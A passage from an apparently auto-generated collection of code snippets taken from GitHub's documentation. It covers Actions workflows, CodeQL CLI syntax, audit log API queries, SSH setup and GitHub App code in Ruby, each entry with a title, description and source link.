circle-ci --output-dir tmp/forecast_reports\n```\n\n----------------------------------------\n\nTITLE: BibTeX Citation with Preferred Article\nDESCRIPTION: This is the BibTeX entry example based on the preferred citation defined in the CITATION.cff file. It shows how BibTeX is modified to cite the journal article as opposed to the software directly.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-citation-files.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\n@article{Lisa_My_awesome_research_2021,\n  author = {Lisa, Mona and Bot, Hew},\n  doi = {10.0000/00000},\n  journal = {Journal Title},\n  month = {9},\n  number = {1},\n  pages = {1--10},\n  title = {{My awesome research software}},\n  volume = {1},\n  year = {2021}\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Job Matrix in GitHub Actions (YAML)\nDESCRIPTION: This snippet defines a job matrix with two variables, `version` and `os`, each with an array of values. GitHub Actions will run a job for each possible combination of these variables. The `jobs.example_matrix.strategy.matrix` specifies the matrix configuration.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/using-matrix-strategy.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  example_matrix:\n    strategy:\n      matrix:\n        version: [10, 12, 14]\n        os: [ubuntu-latest, windows-latest]\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: JavaScript\nDESCRIPTION: This code snippet demonstrates how to use the `javascript` tag to display content relevant to JavaScript users. It wraps instructions specific to JavaScript.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_16\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% javascript %}\n\nThese instructions are pertinent to javascript users.\n\n{% endjavascript %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log by Repository\nDESCRIPTION: This snippet demonstrates how to use the `repo` qualifier to filter audit log events based on specific repositories within an organization. It includes examples of finding events for specific repositories, multiple repositories, and excluding events from a particular repository.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-users-across-your-enterprise.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nrepo:my-org/our-repo\n```\n\nLANGUAGE: text\nCODE:\n```\nrepo:my-org/our-repo repo:my-org/another-repo\n```\n\nLANGUAGE: text\nCODE:\n```\n-repo:my-org/not-this-repo\n```\n\n----------------------------------------\n\nTITLE: Check Run Event Handling\nDESCRIPTION: This Ruby code snippet shows how to handle `check_run` events in a GitHub App. It checks if the event is directed to the app based on the `app_id`. It then uses a case statement to handle different actions such as 'created' and 'rerequested'.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nwhen 'check_run'\n  # Check that the event is being sent to this app\n  if @payload['check_run']['app']['id'].to_s === APP_IDENTIFIER\n    case @payload['action']\n    when 'created'\n      initiate_check_run\n    when 'rerequested'\n      create_check_run\n    # ADD REQUESTED_ACTION METHOD HERE #\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Removing Invalid Attributes in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: `x` is not a permitted attribute\" error. It occurs when an unrecognized attribute key (e.g., `x`) is included within the `attributes` block. The corrected example removes the invalid attribute, using only permitted ones.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    x: \"a random key!\"\n    value: \"Thanks for taking the time to fill out this bug!\"\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug!\"\n```\n\n----------------------------------------\n\nTITLE: Authenticating API request using curl in YAML workflow\nDESCRIPTION: This YAML workflow demonstrates how to authenticate an API request using `curl` within a GitHub Actions workflow. It stores the `GITHUB_TOKEN` as an environment variable and uses it to set the `Authorization` header in the `curl` request. Replace `/PATH` with the API endpoint.  The `GITHUB_TOKEN` secret is automatically provided by GitHub Actions. The `rest_url` variable is assumed to be predefined. No specific inputs or outputs are defined, the API request and its response define the interaction.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/authentication/authenticating-to-the-rest-api.md#_snippet_3\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  use_api:\n    runs-on: ubuntu-latest\n    permissions: {}\n    steps:\n      - env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n        run: |\n          curl --request GET \\\n          --url \"{% data variables.product.rest_url %}/PATH\" \\\n          --header \"Authorization: Bearer $GH_TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit with GitHub App in Ruby\nDESCRIPTION: This snippet shows how to create an Octokit client for a GitHub App.  It requires setting `APP_ID`, `PRIVATE_KEY`, and `INSTALLATION_ID` with appropriate values for your app.  It uses the `create_app_installation.access_token` method to obtain an access token.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'octokit'\n\napp = Octokit::Client.new(\n  client_id: APP_ID,\n  client_secret: PRIVATE_KEY,\n  installation_id: INSTALLATION_ID\n)\n\noctokit = Octokit::Client.new(bearer_token: app.create_app_installation.access_token)\n```\n\n----------------------------------------\n\nTITLE: Adding QL library packs with version ranges - Shell\nDESCRIPTION: This command demonstrates how to add QL library packs as dependencies to the current package using the `codeql pack add` command. It modifies the qlpack.yml file of the current package, removing formatting and comments. The command also installs the specified packs.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-add.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack add <options>... -- <scope/name[@range]>...\n```\n\n----------------------------------------\n\nTITLE: Importing a Mercurial Repository to Git\nDESCRIPTION: This command imports a Mercurial repository into a Git repository. It performs a raw import and more information can be found in the documentation. \nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_80\n\nLANGUAGE: shell\nCODE:\n```\ngit-import-hg-raw\n```\n\n----------------------------------------\n\nTITLE: Executing CodeQL Upgrade Scripts\nDESCRIPTION: The `codeql execute upgrades` command runs a sequence of upgrade scripts against a specified raw QL dataset. The command requires the paths to the dataset and the upgrade scripts as mandatory arguments. The order of the upgrade scripts matters, as they are executed sequentially.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/execute-upgrades.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql execute upgrades [--threads=<num>] <options>... -- <dataset> <script>...\n```\n\n----------------------------------------\n\nTITLE: CodeQL Database Trace Command Syntax - Shell\nDESCRIPTION: This shows the basic syntax of the `codeql database trace-command`. It includes options for specifying the number of threads, memory allocation, and extractor-specific options.  It requires a path to the CodeQL database and the command to be executed.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/database-trace-command.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database trace-command [--threads=<num>] [--ram=<MB>] [--extractor-option=<extractor-option-name=value>] <options>... -- <database> <command>...\n```\n\n----------------------------------------\n\nTITLE: Poetry: Configuring source in pyproject.toml\nDESCRIPTION: This snippet demonstrates how to configure the `[[tool.poetry.source]]` section in the `pyproject.toml` file to point to a private registry. This ensures that Poetry uses the specified private registry to resolve and install dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/maintain-dependencies/removing-dependabot-access-to-public-registries.md#_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\n[[tool.poetry.source]]\nname = \"private\"\nurl = \"https://private_registry_url\"\ndefault = true\n```\n\n----------------------------------------\n\nTITLE: Specifying GitHub Pages Gem in Ruby (Gemfile)\nDESCRIPTION: This Ruby code snippet shows the correct syntax for specifying the `github-pages` gem in a Gemfile, including the version and group.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/creating-a-github-pages-site-with-jekyll.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"github-pages\", \"~> GITHUB-PAGES-VERSION\", group: :jekyll_plugins\n```\n\n----------------------------------------\n\nTITLE: Enabling Code Scanning via SSH Shell\nDESCRIPTION: These commands enable Code Scanning on GitHub Enterprise Server via the administrative shell (SSH).  It requires SSH access to the instance. It uses `ghe-config` to set the `app.minio.enabled` and `app.code-scanning.enabled` configuration options to `true`.  No specific output is expected, but the changes will take effect after applying the configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-github-advanced-security-for-your-enterprise/enabling-github-advanced-security-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.minio.enabled true\nghe-config app.code-scanning.enabled true\n```\n\n----------------------------------------\n\nTITLE: Conditional Workflow with Expression\nDESCRIPTION: This YAML snippet demonstrates the use of an `if` conditional that includes an expression. When an expression starts with `!`, it's mandatory to wrap it within the `${{ }}` syntax to avoid YAML parsing errors. The `startsWith` function checks if the GitHub reference starts with 'refs/tags/'.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/expression-syntax-if.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nif: ${{ ! startsWith(github.ref, 'refs/tags/') }}\n```\n\n----------------------------------------\n\nTITLE: Initializing a Go module for a GitHub CLI extension\nDESCRIPTION: These shell commands initialize a Go module for a GitHub CLI extension and manage its dependencies. It first creates a `go.mod` file with the specified module path and then uses `go mod tidy` to resolve and download dependencies defined in the source code.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\ngo mod init github.com/YOUR-USERNAME/gh-whoami\ngo mod tidy\n```\n\n----------------------------------------\n\nTITLE: Testing SSH Key Connection to GitHub via SSH - Shell\nDESCRIPTION: This command attempts to establish an SSH connection to GitHub (or GitHub Enterprise Server if `ghes` versioning is active) using the `git` user. It is used to verify that your SSH key is properly configured and that you can authenticate with GitHub. The expected output confirms successful authentication but indicates that shell access is not provided.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/using-ssh-agent-forwarding.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ ssh -T git@{% ifversion ghes %}hostname{% else %}github.com{% endif %}\n# Attempt to SSH in to github\n> Hi USERNAME! You've successfully authenticated, but GitHub does not provide\n> shell access.\n```\n\n----------------------------------------\n\nTITLE: Displaying SSH Audit Error Message - Shell\nDESCRIPTION: This code snippet shows the error message that a user will see when attempting to use an invalidated SSH key after an audit has been initiated. It includes a link to approve the key and the fingerprint of the key.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-ssh-keys.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nERROR: Hi USERNAME. We're doing an SSH key audit.\nPlease visit http(s)://HOSTNAME/settings/ssh/audit/2\nto approve this key so we know it's safe.\nFingerprint: ed:21:60:64:c0:dc:2b:16:0f:54:5f:2b:35:2a:94:91\nfatal: The remote end hung up unexpectedly\n```\n\n----------------------------------------\n\nTITLE: Disabling Features with `--disable-features` (Shell)\nDESCRIPTION: Illustrates how to disable specific features using the `--disable-features` option when running an Actions Importer command. This example disables the use of `actions/cache` and `composite-actions`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run ... --disable-features=composite-actions actions/cache\n```\n\n----------------------------------------\n\nTITLE: Web Application Flow Authorization Redirect\nDESCRIPTION: This snippet shows the URL to which users are redirected to authorize the app during the web application flow. It includes the `client_id` as a query parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/generating-a-user-access-token-for-a-github-app.md#_snippet_2\n\nLANGUAGE: HTTP\nCODE:\n```\n{% data variables.product.oauth_host_code %}/login/oauth/authorize?client_id=CLIENT_ID\n```\n\n----------------------------------------\n\nTITLE: Starting SSH Agent in Shell\nDESCRIPTION: This snippet initializes the ssh-agent in the background and sets up the environment variables necessary for it to function correctly within the current shell session. It is often used when interacting with Git repositories over SSH, especially on systems where the ssh-agent is not automatically started.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/desktop/windows_git_for_windows_turn_on_ssh_agent.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# start the ssh-agent in the background\n$ eval $(ssh-agent -s)\n> Agent pid 59566\n```\n\n----------------------------------------\n\nTITLE: Example journalctl Output - Shell\nDESCRIPTION: This is an example output from the `journalctl` command, showing the runner starting, connecting to GitHub, listening for jobs, running a job named `testAction`, and completing the job with a status of \"Succeeded\". It provides insights into the runner's activities and job execution.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nFeb 11 14:57:07 runner01 runsvc.sh[962]: Starting Runner listener with startup type: service\nFeb 11 14:57:07 runner01 runsvc.sh[962]: Started listener process\nFeb 11 14:57:07 runner01 runsvc.sh[962]: Started running service\nFeb 11 14:57:16 runner01 runsvc.sh[962]: √ Connected to GitHub\nFeb 11 14:57:17 runner01 runsvc.sh[962]: 2020-02-11 14:57:17Z: Listening for Jobs\nFeb 11 16:06:54 runner01 runsvc.sh[962]: 2020-02-11 16:06:54Z: Running job: testAction\nFeb 11 16:07:10 runner01 runsvc.sh[962]: 2020-02-11 16:07:10Z: Job testAction completed with result: Succeeded\n```\n\n----------------------------------------\n\nTITLE: Requesting Secret from Vault in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet demonstrates a GitHub Actions job that retrieves a secret from HashiCorp Vault using the `hashicorp/vault-action`. It configures permissions to fetch the OIDC token, specifies the Vault URL, namespace, role, and the path to the secret. The `id-token` permission with `write` access is required.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  retrieve-secret:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - name: Retrieve secret from Vault\n        uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b\n        with:\n          method: jwt\n          url: VAULT-URL\n          namespace: VAULT-NAMESPACE # HCP Vault and Vault Enterprise only\n          role: ROLE-NAME\n          secrets: SECRET-PATH\n\n      - name: Use secret from Vault\n        run: |\n          # This step has access to the secret retrieved above; see hashicorp/vault-action for more details.\n```\n\n----------------------------------------\n\nTITLE: Ruby Workflow Template\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow for building and testing a Ruby project. It triggers on push and pull requests to the main branch, sets up a Ruby environment using ruby/setup-ruby, installs dependencies with Bundler, and runs tests using rake.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-ruby.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Ruby\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\npermissions:\n  contents: read\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        ruby-version: ['2.6', '2.7', '3.0']\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Set up Ruby\n    # To automatically get bug fixes and new Ruby versions for ruby/setup-ruby,\n    # change this to (see https://github.com/ruby/setup-ruby#versioning):\n    # uses: ruby/setup-ruby@v1\n      uses: ruby/setup-ruby@55283cc23133118229fd3f97f9336ee23a179fcf # v1.146.0\n      with:\n        ruby-version: {% raw %}${{ matrix.ruby-version }}{% endraw %}\n        bundler-cache: true # runs 'bundle install' and caches installed gems automatically\n    - name: Run tests\n      run: bundle exec rake\n```\n\n----------------------------------------\n\nTITLE: Filtering Workflow Runs based on Paths (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to configure a GitHub Actions workflow to run only when changes are pushed to files within the `sub-project` directory, excluding files within the `sub-project/docs` directory. It uses the `paths` filter with both positive and negative patterns to achieve this behavior.  The `push` event is configured with specific path patterns. Any push to files matching 'sub-project/**' will trigger the workflow unless those files also match '!sub-project/docs/**'.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflows/triggering-a-workflow-paths4.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    paths:\n      - 'sub-project/**'\n      - '!sub-project/docs/**'\n```\n\n----------------------------------------\n\nTITLE: Following a pagination link in the audit log API\nDESCRIPTION: This cURL command demonstrates how to use a pagination link from the audit log API response to fetch the next page of results. It uses the `-I` flag to only retrieve the headers, which can be useful for checking the availability of further pages. It requires an authorization token and a URL containing the `after` and `before` parameters from the previous response.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/using-the-audit-log-api-for-your-enterprise.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncurl -I -H \"Authorization: Bearer TOKEN\" \\\n--request GET \\\n\"{% data variables.product.rest_url %}/enterprises/13827/audit-log?%3A2022-11-01=&per_page=100&after=MS42Njc4NDA2MjM5NDFlKzEyfHRYa3AwSkxUd2xyRjA5bWxfOS1RbFE%3D&before=\"\n```\n\n----------------------------------------\n\nTITLE: Advanced ERB Template (HTML)\nDESCRIPTION: This HTML code represents an ERB template that displays user information retrieved from the GitHub API. It shows the user's login, public email (if available), and private emails (if the user granted permission). It leverages ERB tags for dynamic content rendering.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<html>\n  <head>\n  </head>\n  <body>\n    <p>Well, well, well, <%= login %>!</p>\n    <p>\n      <% if !email.empty? %> It looks like your public email address is <%= email %>.\n      <% else %> It looks like you don't have a public email. That's cool.\n      <% end %>\n    </p>\n    <p>\n      <% if defined? private_emails %>\n      With your permission, we were also able to dig up your private email addresses:\n      <%= private_emails.map{ |private_email_address| private_email_address[\"email\"] }.join(', ') %>\n      <% else %>\n      Also, you're a bit secretive about your private email addresses.\n      <% end %>\n    </p>\n  </body>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Viewing Firewall Status UFW\nDESCRIPTION: This snippet demonstrates how to check the current status and rules of the UFW firewall. It uses the `sudo ufw status` command to display the active rules and their corresponding actions (ALLOW/DENY) and sources. This is useful for verifying the current firewall configuration.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-built-in-firewall-rules.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo ufw status\n```\n\n----------------------------------------\n\nTITLE: Using TODOCS placeholder in Markdown\nDESCRIPTION: Demonstrates the usage of `TODOCS` placeholder within a Markdown file to indicate a missing element, such as a screenshot.  The Docs test suite is configured to detect instances of `TODOCS` and flag them as errors during the linting process. This prevents incomplete documentation from being published. The placeholder should be replaced with the actual content before merging.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-todocs-placeholder-to-leave-notes.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n1. In the dropdown, select the settings you want to sync.\n\n   TODOCS: ADD A SCREENSHOT OF THE SETTINGS SYNC OPTIONS\n\n1. Click **Sign in & Turn on**, then select the account to which you want your settings to be synced.\n```\n\n----------------------------------------\n\nTITLE: Markdown Alert Example\nDESCRIPTION: Shows how to format alerts using Markdown in GitHub Docs.  It includes examples of a TIP alert and a NOTE alert, demonstrating how to use the `> [!TIP]` and `> [!NOTE]` syntax to highlight important information.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n> [!TIP]\n> Try this out!\n```\n\nLANGUAGE: markdown\nCODE:\n```\n> [!NOTE]\n> Generally alerts should be short.\n>\n> But occasionally may require more than one paragraph\n```\n\n----------------------------------------\n\nTITLE: Get Current Date in yyyy-mm-dd Format\nDESCRIPTION: Retrieves the current date in `yyyy-mm-dd` format and stores it as an environment variable named `DATE`. It uses the `date` command with appropriate formatting options.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/automating-projects-using-actions.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\necho \"DATE=$(date +\"%Y-%m-%d\")\" >> $GITHUB_ENV\n```\n\n----------------------------------------\n\nTITLE: Querying audit log for pull request events with date and actor\nDESCRIPTION: This cURL command retrieves audit log events related to pull requests, filtered by a specific date and actor in an enterprise. It requires an authorization token and uses the `phrase` parameter to specify multiple search terms: `action:pull_request`, `created:>=2022-01-01`, and `actor:octocat`. The terms are joined using the `+` symbol.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/using-the-audit-log-api-for-your-enterprise.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer TOKEN\" \\\n--request GET \\\n\"{% data variables.product.rest_url %}/enterprises/avocado-corp/audit-log?phrase=action:pull_request+created:>\\=2022-01-01+actor:octocat\"\n```\n\n----------------------------------------\n\nTITLE: Committing the Script (Windows)\nDESCRIPTION: Commits the `goodbye.sh` script to the Git repository with the message \"Add goodbye script\" and pushes the changes to the remote repository. These commands are essential for version control and ensuring that the script is available to the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngit commit -m \"Add goodbye script\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Git Error Message for Suspended User\nDESCRIPTION: This code snippet shows the error message a user receives when attempting to clone a repository after their account has been suspended on GitHub Enterprise Server. The error indicates the account is suspended and advises the user to contact the administrator.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/suspending-and-unsuspending-users.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone git@[hostname]:john-doe/test-repo.git\nCloning into 'test-repo'...\nERROR: Your account is suspended. Please check with\nyour installation administrator.\nfatal: The remote end hung up unexpectedly\n```\n\n----------------------------------------\n\nTITLE: Adding changes to staging area with git\nDESCRIPTION: This snippet shows how to add changes to the staging area using `git add .`. This requires a properly configured Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_6\n\nLANGUAGE: text\nCODE:\n```\ngit add .\n```\n\n----------------------------------------\n\nTITLE: Fixing Missing Required Attribute in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: required attribute key `value` is missing\" error. It occurs when a required attribute, like `value` for a `markdown` type, is absent from a list element within the `body` section. The corrected example includes the missing `value` attribute.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n- type: markdown\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"Thanks for taking the time to fill out this bug! If you need real-time help, join us on Discord.\"\n- type: markdown\n  attributes:\n    value: \"This is working now!\"\n```\n\n----------------------------------------\n\nTITLE: Adding Labels and Milestones to Pull Request using gh CLI\nDESCRIPTION: This snippet shows how to add labels and milestones to a pull request using the `--label` and `--milestone` flags with the `gh pr create` command. Labels categorize pull requests, and milestones track progress towards specific goals.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --label \"bug,help wanted\" --milestone octocat-milestone\n```\n\n----------------------------------------\n\nTITLE: Enabling node eligibility using nomad node eligibility\nDESCRIPTION: This snippet shows how to make a node eligible using the `nomad node eligibility` command. This is run on the node itself via SSH.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_11\n\nLANGUAGE: shell\nCODE:\n```\nnomad node eligibility -enable -self\n```\n\n----------------------------------------\n\nTITLE: Pushing changes to the test repository in Docker\nDESCRIPTION: This example shows how to clone a repository, add a new remote pointing to the Docker container, and push changes.  It uses `GIT_SSH_COMMAND` to specify the SSH key and port to use for authentication.  The `UserKnownHostsFile=/dev/null` and `StrictHostKeyChecking=no` options are added to avoid SSH host key verification prompts in a testing environment.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\n$ git clone git@github.com:octocat/Hello-World.git\n$ cd Hello-World\n$ git remote add test git@127.0.0.1:test.git\n$ GIT_SSH_COMMAND=\"ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -p 52311 -i ../id_ed25519\" git push -u test master\n```\n\n----------------------------------------\n\nTITLE: Displaying Dollar Signs Inline Outside Math Expressions\nDESCRIPTION: This snippet demonstrates how to display a dollar sign as a character on the same line as a math expression, but outside of it.  It uses `<span>$</span>` to prevent it from being interpreted as a math delimiter.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/writing-mathematical-expressions.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\nTo split <span>$</span>100 in half, we calculate $100/2$\n```\n\n----------------------------------------\n\nTITLE: Installing the Copilot Extension Debug CLI\nDESCRIPTION: This snippet demonstrates how to install the `gh-debug-cli` extension for the GitHub CLI. It uses the `gh extension install` command followed by the GitHub repository URL of the extension: `github.com/copilot-extensions/gh-debug-cli`.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/debugging-your-github-copilot-extension.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ngh extension install github.com/copilot-extensions/gh-debug-cli\n```\n\n----------------------------------------\n\nTITLE: Operating System Tag: Mac\nDESCRIPTION: This code snippet demonstrates how to use the `mac` tag to display content relevant to Mac users. It wraps instructions that are specific to the Mac operating system.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% mac %}\n\nThese instructions are pertinent to Mac users.\n\n{% endmac %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Cluster Maintenance Mode (ghe-cluster-maintenance)\nDESCRIPTION: With the `ghe-cluster-maintenance` utility, you can set or unset maintenance mode for every node in a cluster. Options exist to query the current mode, set maintenance mode, set maintenance mode with a custom message, update the custom message, and unset maintenance mode.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_34\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-cluster-maintenance -h\n```\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-cluster-maintenance -q\n```\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-cluster-maintenance -s\n```\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-cluster-maintenance -s \"MESSAGE\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-cluster-maintenance -m \"MESSAGE\"\n```\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-cluster-maintenance -u\n```\n\n----------------------------------------\n\nTITLE: Initializing Sinatra App for GitHub Webhooks (Ruby)\nDESCRIPTION: This snippet initializes a Sinatra application to handle GitHub webhook events. It sets the port, bind address, and retrieves the private key, webhook secret, and app identifier from environment variables. It also configures verbose logging during development.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_45\n\nLANGUAGE: Ruby\nCODE:\n```\nclass GHAapp < Sinatra::Application\n\n  # Sets the port that's used when starting the web server.\n  set :port, 3000\n  set :bind, '0.0.0.0'\n\n  # Expects the private key in PEM format. Converts the newlines.\n  PRIVATE_KEY = OpenSSL::PKey::RSA.new(ENV['GITHUB_PRIVATE_KEY'].gsub('\\n', \"\\n\"))\n\n  # Your registered app must have a webhook secret.\n  # The secret is used to verify that webhooks are sent by GitHub.\n  WEBHOOK_SECRET = ENV['GITHUB_WEBHOOK_SECRET']\n\n  # The GitHub App's identifier (type integer).\n  APP_IDENTIFIER = ENV['GITHUB_APP_IDENTIFIER']\n\n  # Turn on Sinatra's verbose logging during development\n  configure :development do\n    set :logging, Logger::DEBUG\n  end\n```\n\n----------------------------------------\n\nTITLE: Executing Shell Command for Copilot Documentation in Vim/Neovim\nDESCRIPTION: This command is used in Vim or Neovim to view the documentation for the GitHub Copilot plugin.  It opens the Copilot 